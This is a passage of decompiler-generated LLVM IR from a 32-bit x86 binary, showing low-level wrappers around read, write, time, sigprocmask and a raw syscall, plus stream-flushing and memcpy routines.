  %v0_804e034 = phi i32 [ %v2_804e01c, %dec_label_pc_804e00c ], [ -1, %dec_label_pc_804e028 ]
  store i32 %v2_804e038, i32* @edi, align 4
  ret i32 %v0_804e034

; uselistorder directives
  uselistorder i32 %v2_804e01c, { 1, 0, 2 }
  uselistorder i32 %v0_804e014, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e034, { 1, 0 }
}

define i32 @function_804e03c(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804e03c:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e03c = load i32, i32* @edi, align 4
  store i32 %v0_804e03c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e04c = load i32, i32* @ebx, align 4
  %v4_804e054 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804e04c, i32* @ebx, align 4
  store i32 %v4_804e054, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_804e054, -4095
  br i1 %tmp12, label %dec_label_pc_804e06c, label %dec_label_pc_804e060

dec_label_pc_804e060:                             ; preds = %dec_label_pc_804e03c
  %v1_804e060 = call i32 @function_804e1ec(i32 %v0_804e04c)
  %v0_804e065 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e065 = sub i32 0, %v0_804e065
  %v2_804e067 = inttoptr i32 %v1_804e060 to i32*
  store i32 %v1_804e065, i32* %v2_804e067, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804e070.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804e06c

dec_label_pc_804e06c:                             ; preds = %dec_label_pc_804e03c, %dec_label_pc_804e060
  %v2_804e070 = phi i32 [ %v0_804e03c, %dec_label_pc_804e03c ], [ %v2_804e070.pre, %dec_label_pc_804e060 ]
  %v0_804e06c = phi i32 [ %v4_804e054, %dec_label_pc_804e03c ], [ -1, %dec_label_pc_804e060 ]
  store i32 %v2_804e070, i32* @edi, align 4
  ret i32 %v0_804e06c

; uselistorder directives
  uselistorder i32 %v4_804e054, { 1, 0, 2 }
  uselistorder i32 %v0_804e04c, { 1, 0 }
  uselistorder label %dec_label_pc_804e06c, { 1, 0 }
}

define i32 @function_804e074(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804e074:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e075 = load i32, i32* @esi, align 4
  store i32 %v0_804e075, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804e08d = load i32, i32* @ebx, align 4
  %v1_804e095 = call i32 @int80_syscall(i32 142)
  store i32 %v0_804e08d, i32* @ebx, align 4
  store i32 %v1_804e095, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_804e095, -4095
  br i1 %tmp12, label %dec_label_pc_804e0ad, label %dec_label_pc_804e0a1

dec_label_pc_804e0a1:                             ; preds = %dec_label_pc_804e074
  %v1_804e0a1 = call i32 @function_804e1ec(i32 %v0_804e08d)
  %v0_804e0a6 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e0a6 = sub i32 0, %v0_804e0a6
  %v2_804e0a8 = inttoptr i32 %v1_804e0a1 to i32*
  store i32 %v1_804e0a6, i32* %v2_804e0a8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_804e0b0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804e0ad

dec_label_pc_804e0ad:                             ; preds = %dec_label_pc_804e074, %dec_label_pc_804e0a1
  %v2_804e0b0 = phi i32 [ %v0_804e075, %dec_label_pc_804e074 ], [ %v2_804e0b0.pre, %dec_label_pc_804e0a1 ]
  %v0_804e0ad = phi i32 [ %v1_804e095, %dec_label_pc_804e074 ], [ -1, %dec_label_pc_804e0a1 ]
  store i32 %v2_804e0b0, i32* @esi, align 4
  ret i32 %v0_804e0ad

; uselistorder directives
  uselistorder i32 %v1_804e095, { 1, 0, 2 }
  uselistorder i32 %v0_804e08d, { 1, 0 }
  uselistorder label %dec_label_pc_804e0ad, { 1, 0 }
}

define i32 @function_804e0dc(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804e0dc:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804e0dd = load i32, i32* @esi, align 4
  %v4_804e0e1 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804e0e1, i32* @ecx, align 4
  %v2_804e0ed = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  %tmp11 = icmp ult i32 %arg1, 3
  %or.cond = or i1 %tmp11, %v2_804e0ed
  br i1 %or.cond, label %dec_label_pc_804e106, label %dec_label_pc_804e0f6

dec_label_pc_804e0f6:                             ; preds = %dec_label_pc_804e0dc
  %v1_804e0f6 = call i32 @function_804e1ec(i32 %v0_804e0dd)
  %v1_804e0fb = inttoptr i32 %v1_804e0f6 to i32*
  store i32 22, i32* %v1_804e0fb, align 4
  br label %dec_label_pc_804e12d

dec_label_pc_804e106:                             ; preds = %dec_label_pc_804e0dc
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804e10b = load i32, i32* @ebx, align 4
  %v7_804e113 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804e10b, i32* @ebx, align 4
  store i32 %v7_804e113, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_804e113, -4095
  br i1 %tmp12, label %dec_label_pc_804e12d, label %dec_label_pc_804e11f

dec_label_pc_804e11f:                             ; preds = %dec_label_pc_804e106
  %v1_804e11f = call i32 @function_804e1ec(i32 %v0_804e10b)
  %v0_804e124 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e124 = sub i32 0, %v0_804e124
  %v2_804e126 = inttoptr i32 %v1_804e11f to i32*
  store i32 %v1_804e124, i32* %v2_804e126, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e12d

dec_label_pc_804e12d:                             ; preds = %dec_label_pc_804e11f, %dec_label_pc_804e106, %dec_label_pc_804e0f6
  %storemerge = phi i32 [ -1, %dec_label_pc_804e0f6 ], [ %v7_804e113, %dec_label_pc_804e106 ], [ -1, %dec_label_pc_804e11f ]
  %v2_804e12d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e12d, i32* @edx, align 4
  store i32 %v0_804e0dd, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804e113, { 1, 0, 2 }
  uselistorder i32 %v0_804e10b, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_804e134(i32* %arg1) local_unnamed_addr {
dec_label_pc_804e134:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804e134 = load i32, i32* @edi, align 4
  store i32 %v0_804e134, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_804e13c = load i32, i32* @ebx, align 4
  %v2_804e144 = call i32 @time(i32* %arg1)
  store i32 %v0_804e13c, i32* @ebx, align 4
  store i32 %v2_804e144, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v2_804e144, -4095
  br i1 %tmp10, label %dec_label_pc_804e15c, label %dec_label_pc_804e150

dec_label_pc_804e150:                             ; preds = %dec_label_pc_804e134
  %v1_804e150 = call i32 @function_804e1ec(i32 %v0_804e13c)
  %v0_804e155 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e155 = sub i32 0, %v0_804e155
  %v2_804e157 = inttoptr i32 %v1_804e150 to i32*
  store i32 %v1_804e155, i32* %v2_804e157, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804e160.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804e15c

dec_label_pc_804e15c:                             ; preds = %dec_label_pc_804e134, %dec_label_pc_804e150
  %v2_804e160 = phi i32 [ %v0_804e134, %dec_label_pc_804e134 ], [ %v2_804e160.pre, %dec_label_pc_804e150 ]
  %v0_804e15c = phi i32 [ %v2_804e144, %dec_label_pc_804e134 ], [ -1, %dec_label_pc_804e150 ]
  store i32 %v2_804e160, i32* @edi, align 4
  ret i32 %v0_804e15c

; uselistorder directives
  uselistorder i32 %v2_804e144, { 1, 0, 2 }
  uselistorder i32 %v0_804e13c, { 1, 0 }
  uselistorder label %dec_label_pc_804e15c, { 1, 0 }
}

define i32 @function_804e164(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804e164:
  %v5_804e175 = call i32 @function_8051374(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* null)
  ret i32 %v5_804e175
}

define i32 @function_804e180(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804e180:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e180 = load i32, i32* @edi, align 4
  store i32 %v0_804e180, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e190 = load i32, i32* @ebx, align 4
  %v4_804e198 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804e190, i32* @ebx, align 4
  store i32 %v4_804e198, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_804e198, -4095
  br i1 %tmp12, label %dec_label_pc_804e1b0, label %dec_label_pc_804e1a4

dec_label_pc_804e1a4:                             ; preds = %dec_label_pc_804e180
  %v1_804e1a4 = call i32 @function_804e1ec(i32 %v0_804e190)
  %v0_804e1a9 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e1a9 = sub i32 0, %v0_804e1a9
  %v2_804e1ab = inttoptr i32 %v1_804e1a4 to i32*
  store i32 %v1_804e1a9, i32* %v2_804e1ab, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_804e1b4.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804e1b0

dec_label_pc_804e1b0:                             ; preds = %dec_label_pc_804e180, %dec_label_pc_804e1a4
  %v2_804e1b4 = phi i32 [ %v0_804e180, %dec_label_pc_804e180 ], [ %v2_804e1b4.pre, %dec_label_pc_804e1a4 ]
  %v0_804e1b0 = phi i32 [ %v4_804e198, %dec_label_pc_804e180 ], [ -1, %dec_label_pc_804e1a4 ]
  %v2_804e1b2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e1b2, i32* @edx, align 4
  store i32 %v2_804e1b4, i32* @edi, align 4
  ret i32 %v0_804e1b0

; uselistorder directives
  uselistorder i32 %v4_804e198, { 1, 0, 2 }
  uselistorder i32 %v0_804e190, { 1, 0 }
  uselistorder label %dec_label_pc_804e1b0, { 1, 0 }
}

define i32 @function_804e1b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e1b8:
  %v0_804e1bc = load i32, i32* inttoptr (i32 134566308 to i32*), align 4
  %v2_804e1c1 = mul i32 %arg1, 2
  %v3_804e1c1 = add i32 %v0_804e1bc, %v2_804e1c1
  %v4_804e1c1 = inttoptr i32 %v3_804e1c1 to i16*
  %v5_804e1c1 = load i16, i16* %v4_804e1c1, align 2
  %v6_804e1c1 = zext i16 %v5_804e1c1 to i32
  %v1_804e1c5 = and i32 %v6_804e1c1, 32
  ret i32 %v1_804e1c5
}

define i32 @function_804e1cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e1cc:
  store i32 %arg1, i32* @edx, align 4
  %v1_804e1d0 = add i32 %arg1, 128
  %v6_804e1db = icmp ugt i32 %v1_804e1d0, 383
  br i1 %v6_804e1db, label %dec_label_pc_804e1e6, label %dec_label_pc_804e1dd

dec_label_pc_804e1dd:                             ; preds = %dec_label_pc_804e1cc
  %v0_804e1dd = load i32, i32* inttoptr (i32 134566316 to i32*), align 4
  %v2_804e1e2 = mul i32 %arg1, 2
  %v3_804e1e2 = add i32 %v0_804e1dd, %v2_804e1e2
  %v4_804e1e2 = inttoptr i32 %v3_804e1e2 to i16*
  %v5_804e1e2 = load i16, i16* %v4_804e1e2, align 2
  %v6_804e1e2 = sext i16 %v5_804e1e2 to i32
  store i32 %v6_804e1e2, i32* @edx, align 4
  br label %dec_label_pc_804e1e6

dec_label_pc_804e1e6:                             ; preds = %dec_label_pc_804e1cc, %dec_label_pc_804e1dd
  %v0_804e1e6 = phi i32 [ %arg1, %dec_label_pc_804e1cc ], [ %v6_804e1e2, %dec_label_pc_804e1dd ]
  ret i32 %v0_804e1e6

; uselistorder directives
  uselistorder label %dec_label_pc_804e1e6, { 1, 0 }
}

define i32 @function_804e1ec(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e1ec:
  ret i32 ptrtoint (i32* @global_var_805b494.49 to i32)
}

define i32 @function_804e290() local_unnamed_addr {
dec_label_pc_804e290:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e291 = load i32, i32* @edi, align 4
  %v0_804e292 = load i32, i32* @esi, align 4
  %v0_804e293 = load i32, i32* @ebx, align 4
  store i32 %v0_804e293, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804e29c = call i32 @function_804e1ec(i32 %v0_804e293)
  store i32 %v1_804e29c, i32* @edi, align 4
  %v0_804e2a6 = load i32, i32* @global_var_8055200.46, align 512
  store i32 %v0_804e2a6, i32* @esi, align 4
  %v1_804e2ac = inttoptr i32 %v1_804e29c to i32*
  %v2_804e2ac = load i32, i32* %v1_804e2ac, align 4
  store i32 %v2_804e2ac, i32* %ebp.global-to-local, align 4
  %v1_804e2b0 = call i32 @function_804f440(i32 0)
  %v0_804e2b5 = load i32, i32* @ebx, align 4
  %v2_804e2b7 = sub i32 %v0_804e2b5, %v1_804e2b0
  %v2_804e2c2 = mul i32 %v2_804e2b7, 256
  %v0_804e2c5 = load i32, i32* @esi, align 4
  %v2_804e2c5 = xor i32 %v0_804e2c5, %v2_804e2c2
  %v1_804e2c7 = trunc i32 %v2_804e2c5 to i16
  store i16 %v1_804e2c7, i16* bitcast (i32* @global_var_8055200.46 to i16*), align 512
  %v0_804e2ce = load i32, i32* @global_var_8055250.47, align 16
  store i32 %v0_804e2ce, i32* @esi, align 4
  %v1_804e2d4 = call i32 @function_804f440(i32 1)
  %v0_804e2d9 = load i32, i32* @ebx, align 4
  %v2_804e2d9 = sub i32 %v0_804e2d9, %v1_804e2d4
  %v2_804e2db = mul i32 %v2_804e2d9, 256
  %v0_804e2de = load i32, i32* @esi, align 4
  %v2_804e2de = xor i32 %v2_804e2db, %v0_804e2de
  %v1_804e2e0 = trunc i32 %v2_804e2de to i16
  store i16 %v1_804e2e0, i16* bitcast (i32* @global_var_8055250.47 to i16*), align 16
  %v0_804e2e7 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e2e7 = load i32, i32* @edi, align 4
  %v2_804e2e7 = inttoptr i32 %v1_804e2e7 to i32*
  store i32 %v0_804e2e7, i32* %v2_804e2e7, align 4
  %v2_804e2ec = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e2ec, i32* @ebx, align 4
  store i32 %v0_804e292, i32* @esi, align 4
  store i32 %v0_804e291, i32* @edi, align 4
  ret i32 %v1_804e2d4

; uselistorder directives
  uselistorder i32 %v1_804e29c, { 1, 0 }
  uselistorder i32 (i32)* @function_804f440, { 1, 0 }
}

define i32 @function_804e2f1(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e2f1:
  %v3_804e2ff = inttoptr i32 %arg1 to i16*
  %v4_804e2ff = call i32 @function_804f1b0(i16* %v3_804e2ff, i32 ptrtoint (i32* @global_var_8053160.50 to i32), i32 24)
  ret i32 %v4_804e2ff
}

define i32 @function_804e308() local_unnamed_addr {
dec_label_pc_804e308:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e308 = load i32, i32* @esi, align 4
  %v0_804e309 = load i32, i32* @ebx, align 4
  store i32 %v0_804e309, i32* %stack_var_-8, align 4
  %v1_804e312 = call i32 @function_804e2f1(i32 ptrtoint (i32* @global_var_80551c8.51 to i32))
  store i32 %v1_804e312, i32* %eax.global-to-local, align 4
  %v1_804e31e = call i32 @function_804e2f1(i32 ptrtoint (i32* @global_var_80551e0.52 to i32))
  store i32 %v1_804e31e, i32* %eax.global-to-local, align 4
  %storemerge16 = load i32, i32* bitcast (i32** @global_var_80551c4.53 to i32*), align 4
  store i32 %storemerge16, i32* %ebx.global-to-local, align 4
  %v1_804e36817 = icmp eq i32 %storemerge16, 0
  %v1_804e36a18 = icmp eq i1 %v1_804e36817, false
  br i1 %v1_804e36a18, label %dec_label_pc_804e32b, label %dec_label_pc_804e388.preheader

dec_label_pc_804e32b:                             ; preds = %dec_label_pc_804e308, %dec_label_pc_804e352
  %storemerge19 = phi i32 [ %storemerge, %dec_label_pc_804e352 ], [ %storemerge16, %dec_label_pc_804e308 ]
  %v1_804e32e = add i32 %storemerge19, 56
  store i32 %v1_804e32e, i32* @esi, align 4
  %v1_804e332 = call i32 @function_8050ddf(i32 %v1_804e32e)
  store i32 %v1_804e332, i32* %eax.global-to-local, align 4
  %v1_804e33a = icmp eq i32 %v1_804e332, 0
  br i1 %v1_804e33a, label %dec_label_pc_804e352, label %dec_label_pc_804e33e

dec_label_pc_804e33e:                             ; preds = %dec_label_pc_804e32b
  %v0_804e33e = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e33e = add i32 %v0_804e33e, 8
  %v2_804e33e = inttoptr i32 %v1_804e33e to i32*
  %v3_804e33e = load i32, i32* %v2_804e33e, align 4
  store i32 %v3_804e33e, i32* %eax.global-to-local, align 4
  %v1_804e341 = inttoptr i32 %v0_804e33e to i16*
  store i16 48, i16* %v1_804e341, align 2
  %v0_804e346 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e346 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e346 = add i32 %v1_804e346, 24
  %v3_804e346 = inttoptr i32 %v2_804e346 to i32*
  store i32 %v0_804e346, i32* %v3_804e346, align 4
  %v0_804e349 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e349 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e349 = add i32 %v1_804e349, 28
  %v3_804e349 = inttoptr i32 %v2_804e349 to i32*
  store i32 %v0_804e349, i32* %v3_804e349, align 4
  %v0_804e34c = load i32, i32* %eax.global-to-local, align 4
  %v1_804e34c = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e34c = add i32 %v1_804e34c, 16
  %v3_804e34c = inttoptr i32 %v2_804e34c to i32*
  store i32 %v0_804e34c, i32* %v3_804e34c, align 4
  %v0_804e34f = load i32, i32* %eax.global-to-local, align 4
  %v1_804e34f = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e34f = add i32 %v1_804e34f, 20
  %v3_804e34f = inttoptr i32 %v2_804e34f to i32*
  store i32 %v0_804e34f, i32* %v3_804e34f, align 4
  br label %dec_label_pc_804e352

dec_label_pc_804e352:                             ; preds = %dec_label_pc_804e32b, %dec_label_pc_804e33e
  %v0_804e355 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e355 = add i32 %v0_804e355, 52
  %v2_804e355 = inttoptr i32 %v1_804e355 to i32*
  store i32 1, i32* %v2_804e355, align 4
  %v0_804e35c = load i32, i32* @esi, align 4
  %v1_804e35d = call i32 @function_804e2f1(i32 %v0_804e35c)
  store i32 %v1_804e35d, i32* %eax.global-to-local, align 4
  %v0_804e362 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e362 = add i32 %v0_804e362, 32
  %v2_804e362 = inttoptr i32 %v1_804e362 to i32*
  %storemerge = load i32, i32* %v2_804e362, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804e368 = icmp eq i32 %storemerge, 0
  %v1_804e36a = icmp eq i1 %v1_804e368, false
  br i1 %v1_804e36a, label %dec_label_pc_804e32b, label %dec_label_pc_804e365.dec_label_pc_804e388.preheader_crit_edge

dec_label_pc_804e365.dec_label_pc_804e388.preheader_crit_edge: ; preds = %dec_label_pc_804e352
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_80551c4.53 to i32*), align 4
  br label %dec_label_pc_804e388.preheader

dec_label_pc_804e388.preheader:                   ; preds = %dec_label_pc_804e365.dec_label_pc_804e388.preheader_crit_edge, %dec_label_pc_804e308
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804e365.dec_label_pc_804e388.preheader_crit_edge ], [ %storemerge16, %dec_label_pc_804e308 ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804e3883 = icmp eq i32 %storemerge12, 0
  %v1_804e38a5 = icmp eq i1 %v1_804e3883, false
  br i1 %v1_804e38a5, label %dec_label_pc_804e374, label %dec_label_pc_804e38c

dec_label_pc_804e374:                             ; preds = %dec_label_pc_804e388.preheader, %dec_label_pc_804e385
  %v0_804e37c = phi i32 [ %storemerge1, %dec_label_pc_804e385 ], [ %storemerge12, %dec_label_pc_804e388.preheader ]
  %v1_804e374 = inttoptr i32 %v0_804e37c to i8*
  %v2_804e374 = load i8, i8* %v1_804e374, align 1
  %v3_804e374 = and i8 %v2_804e374, 64
  %v4_804e374 = icmp eq i8 %v3_804e374, 0
  br i1 %v4_804e374, label %dec_label_pc_804e385, label %dec_label_pc_804e379

dec_label_pc_804e379:                             ; preds = %dec_label_pc_804e374
  %v1_804e37d = call i32 @function_804e390(i32 %v0_804e37c)
  store i32 %v1_804e37d, i32* %eax.global-to-local, align 4
  %v0_804e385.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e385

dec_label_pc_804e385:                             ; preds = %dec_label_pc_804e374, %dec_label_pc_804e379
  %v0_804e385 = phi i32 [ %v0_804e37c, %dec_label_pc_804e374 ], [ %v0_804e385.pre, %dec_label_pc_804e379 ]
  %v1_804e385 = add i32 %v0_804e385, 32
  %v2_804e385 = inttoptr i32 %v1_804e385 to i32*
  %storemerge1 = load i32, i32* %v2_804e385, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804e388 = icmp eq i32 %storemerge1, 0
  %v1_804e38a = icmp eq i1 %v1_804e388, false
  br i1 %v1_804e38a, label %dec_label_pc_804e374, label %dec_label_pc_804e38c

dec_label_pc_804e38c:                             ; preds = %dec_label_pc_804e385, %dec_label_pc_804e388.preheader
  %v2_804e38c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e38c, i32* %eax.global-to-local, align 4
  %v2_804e38d = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e38d, i32* %ebx.global-to-local, align 4
  store i32 %v0_804e308, i32* @esi, align 4
  ret i32 %v2_804e38c

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %storemerge16, { 1, 0, 2, 3 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i8 64, { 1, 0 }
  uselistorder i32* @global_var_8055200.46, { 1, 2, 0 }
  uselistorder i32 (i32)* @function_804e2f1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e385, { 1, 0 }
  uselistorder label %dec_label_pc_804e374, { 1, 0 }
  uselistorder label %dec_label_pc_804e352, { 1, 0 }
  uselistorder label %dec_label_pc_804e32b, { 1, 0 }
}

define i32 @function_804e390(i32 %arg1) local_unnamed_addr {
dec_label_pc_804e390:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804e390 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e398 = add i32 %arg1, 8
  %v2_804e398 = inttoptr i32 %v1_804e398 to i32*
  %v3_804e398 = load i32, i32* %v2_804e398, align 4
  store i32 %v3_804e398, i32* %edx.global-to-local, align 4
  %v1_804e39b = add i32 %arg1, 16
  %v2_804e39b = inttoptr i32 %v1_804e39b to i32*
  %v3_804e39b = load i32, i32* %v2_804e39b, align 4
  %v2_804e39e = sub i32 %v3_804e39b, %v3_804e398
  %v12_804e39e = icmp eq i32 %v2_804e39e, 0
  store i32 %v2_804e39e, i32* %eax.global-to-local, align 4
  br i1 %v12_804e39e, label %dec_label_pc_804e3b1, label %dec_label_pc_804e3a2

dec_label_pc_804e3a2:                             ; preds = %dec_label_pc_804e390
  store i32 %v3_804e398, i32* %v2_804e39b, align 4
  %v0_804e3a5 = load i32, i32* @ecx, align 4
  %v0_804e3a6 = load i32, i32* %eax.global-to-local, align 4
  %v0_804e3a7 = load i32, i32* %edx.global-to-local, align 4
  %v0_804e3a8 = load i32, i32* @ebx, align 4
  %v4_804e3a9 = inttoptr i32 %v0_804e3a8 to i16*
  %v5_804e3a9 = call i32 @function_805149c(i16* %v4_804e3a9, i32 %v0_804e3a7, i32 %v0_804e3a6, i32 %v0_804e3a5)
  store i32 %v5_804e3a9, i32* %eax.global-to-local, align 4
  %v0_804e3b1.pre = load i32, i32* @ebx, align 4
  %v2_804e3b7.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804e3b1

dec_label_pc_804e3b1:                             ; preds = %dec_label_pc_804e390, %dec_label_pc_804e3a2
  %v2_804e3b7 = phi i32 [ %tmp11, %dec_label_pc_804e390 ], [ %v2_804e3b7.pre, %dec_label_pc_804e3a2 ]
  %v0_804e3b1 = phi i32 [ %arg1, %dec_label_pc_804e390 ], [ %v0_804e3b1.pre, %dec_label_pc_804e3a2 ]
  %v1_804e3b1 = add i32 %v0_804e3b1, 16
  %v2_804e3b1 = inttoptr i32 %v1_804e3b1 to i32*
  %v3_804e3b1 = load i32, i32* %v2_804e3b1, align 4
  store i32 %v3_804e3b1, i32* %eax.global-to-local, align 4
  %v2_804e3b4 = add i32 %v0_804e3b1, 8
  %v3_804e3b4 = inttoptr i32 %v2_804e3b4 to i32*
  %v4_804e3b4 = load i32, i32* %v3_804e3b4, align 4
  %v5_804e3b4 = sub i32 %v3_804e3b1, %v4_804e3b4
  store i32 %v5_804e3b4, i32* %eax.global-to-local, align 4
  store i32 %v2_804e3b7, i32* %edx.global-to-local, align 4
  store i32 %v0_804e390, i32* @ebx, align 4
  ret i32 %v5_804e3b4

; uselistorder directives
  uselistorder i32 %v0_804e3b1, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804e3b1, { 1, 0 }
}

define i32 @function_804f1b0(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804f1b0:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f1b1 = load i32, i32* @esi, align 4
  store i32 %v0_804f1b1, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804f1b2 = sdiv i32 %sext, 16777216
  store i32 %v4_804f1b2, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f1bc = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f1bc, i32* %edi.global-to-local, align 4
  %v2_804f1c0 = udiv i32 %v4_804f1b2, 4
  %v3_804f1c3 = inttoptr i32 %arg2 to i8*
  %v4_804f1c3 = bitcast i16* %arg1 to i8*
  %v5_804f1c3 = call i8* @_memcpy(i8* %v4_804f1c3, i8* %v3_804f1c3, i32 %v2_804f1c0)
  %v6_804f1c3 = ptrtoint i8* %v5_804f1c3 to i32
  store i32 %v6_804f1c3, i32* @ecx, align 4
  %v0_804f1c5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f1c5 = and i32 %v0_804f1c5, 2
  %v3_804f1c5 = icmp eq i32 %v2_804f1c5, 0
  br i1 %v3_804f1c5, label %dec_label_pc_804f1cb, label %dec_label_pc_804f1c9

dec_label_pc_804f1c9:                             ; preds = %dec_label_pc_804f1b0
  %v0_804f1c9 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f1c9 = inttoptr i32 %v0_804f1c9 to i16*
  %v2_804f1c9 = load i16, i16* %v1_804f1c9, align 2
  %v3_804f1c9 = load i32, i32* %edi.global-to-local, align 4
  %v4_804f1c9 = inttoptr i32 %v3_804f1c9 to i16*
  store i16 %v2_804f1c9, i16* %v4_804f1c9, align 2
  %v5_804f1c9 = load i32, i32* %edi.global-to-local, align 4
  %v6_804f1c9 = load i32, i32* %esi.global-to-local, align 4
  %v9_804f1c9 = add i32 %v5_804f1c9, 2
  %v10_804f1c9 = add i32 %v6_804f1c9, 2
  store i32 %v9_804f1c9, i32* %edi.global-to-local, align 4
  store i32 %v10_804f1c9, i32* %esi.global-to-local, align 4
  %v0_804f1cb.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f1cb

dec_label_pc_804f1cb:                             ; preds = %dec_label_pc_804f1b0, %dec_label_pc_804f1c9
